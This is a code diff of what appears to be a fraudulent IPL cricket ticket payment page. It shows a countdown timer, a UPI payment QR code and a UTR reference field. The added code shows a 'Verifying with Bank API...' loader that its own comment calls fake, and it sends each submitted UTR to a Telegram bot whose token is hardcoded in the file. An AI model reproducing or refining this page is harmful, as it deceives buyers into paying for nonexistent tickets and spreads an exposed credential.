@@ -210,33 +210,38 @@
     </div>
 
     <script>
-        // Global variables
-        let currentUpiId = ""; 
+        // Global UI Variable safe definition
+        window.currentUpiId = ""; 
 
-        // --- ⏳ TIMER LOGIC ---
+        // 1. Timer Logic
         let timeLeft = 300; 
         const timerEl = document.getElementById('timer');
-        let timerId = setInterval(() => {
-            if(timeLeft <= 0) {
-                clearInterval(timerId);
-                timerEl.innerText = "00:00";
-                return;
-            }
+        setInterval(() => {
+            if(timeLeft <= 0) { timerEl.innerText = "00:00"; return; }
             timeLeft--;
             let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
             let s = (timeLeft % 60).toString().padStart(2, '0');
             timerEl.innerText = m + ':' + s;
         }, 1000);
 
-        // --- ORDER SUMMARY LOGIC ---
+        // 2. Load Details Safely (Error-Proof)
         const finalPrice = localStorage.getItem('finalPrice') || 0;
-        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
+        let matchTitle = "IPL Match Ticket";
+        
+        try {
+            const savedMatch = localStorage.getItem('selectedMatch');
+            if(savedMatch) {
+                const parsedMatch = JSON.parse(savedMatch);
+                if(parsedMatch && parsedMatch.title) matchTitle = parsedMatch.title;
+            }
+        } catch(e) { console.log("Match title parse safe fallback"); }
         
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
         document.getElementById('s-match').innerText = matchTitle;
         document.getElementById('s-total').innerText = "₹" + finalPrice;
 
-        function toggleSummary() {
+        // 3. View Summary Dropdown
+        window.toggleSummary = function() {
             const details = document.getElementById('summary-details');
             const arrow = document.getElementById('arrow');
             if(details.style.display === 'block') {
@@ -248,37 +253,32 @@
             }
         }
 
-        // --- 📋 UTILITY LOGIC (Copy & Save) ---
-        function copyUPI() {
-            if (currentUpiId === "") return;
-            navigator.clipboard.writeText(currentUpiId).then(() => {
+        // 4. Utility Functions (Copy/Save)
+        window.copyUPI = function() {
+            if (!window.currentUpiId) return;
+            navigator.clipboard.writeText(window.currentUpiId).then(() => {
                 const msgEl = document.getElementById('upi-copied-msg');
-                msgEl.innerText = "UPI ID Copied to Clipboard!";
+                msgEl.innerText = "UPI ID Copied!";
                 msgEl.style.display = 'block';
                 setTimeout(() => { msgEl.style.display = 'none'; }, 2000);
-            }).catch(err => {
-                alert("Failed to copy UPI. Please copy manually.");
-            });
+            }).catch(() => alert("Failed to copy."));
         }
 
-        function downloadQR() {
+        window.downloadQR = function() {
             const qrImg = document.getElementById('qr-code');
             const url = qrImg.src;
-            if (url === "" || url.startsWith('blob')) {
-                alert("Please wait for QR to load.");
-                return;
-            }
-            // Create a temporary link to download
+            if (!url) return;
             const a = document.createElement('a');
             a.href = url;
-            a.download = `IPL_Ticket_QR_${Date.now()}.png`; // Set filename
+            a.target = '_blank';
+            a.download = `Secure_QR.png`; 
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
         }
 
-        // --- UTR VALIDATION LOGIC ---
-        function checkUTR() {
+        // 5. Check UTR Field
+        window.checkUTR = function() {
             const val = document.getElementById('utr').value;
             const btn = document.getElementById('pay-btn');
             const errorMsg = document.getElementById('utr-error');
@@ -296,7 +296,8 @@
             }
         }
 
-        function submitPayment() {
+        // 6. Submit Payment & Telegram Alert
+        window.submitPayment = function() {
             const val = document.getElementById('utr').value;
             const errorMsg = document.getElementById('utr-error');
             const utrInput = document.getElementById('utr');
@@ -304,12 +305,11 @@
             const btnLoader = document.getElementById('btn-loader');
             const btnText = document.getElementById('btn-text');
 
-            // 🔥 SMART ANTI-FRAUD UTR CHECK 🔥
             let isFake = false;
             if(val.length !== 12) isFake = true;
             else if(val.startsWith('0')) isFake = true;
             else if(/^(\d)\1{11}$/.test(val)) isFake = true;
-            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isFake = true;
+            else if(val === '123456789012' || val === '098765432109') isFake = true;
 
             if(isFake) {
                 errorMsg.style.display = 'flex';
@@ -318,14 +318,14 @@
                 errorMsg.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // ⏳ FAKE API DELAY
+                // Show Fake Verification API Loader
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
                 btnLoader.style.display = "block";
 
                 setTimeout(() => {
-                    // --- ✈️ TELEGRAM UTR ALERT ---
+                    // TELEGRAM ALERT
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
                     const chatId = "YOUR_CHAT_ID"; // 👈 YAHAN APNI CHAT ID DAALEIN
                     
@@ -360,5 +360,4 @@
         import { db, ref, onValue } from "./js/firebase.js";
 
         const price = localStorage.getItem('finalPrice') || 0;
-        const qrImg = document.getElementById('qr-code');
-      
+        const qrImg = document.getElementByI
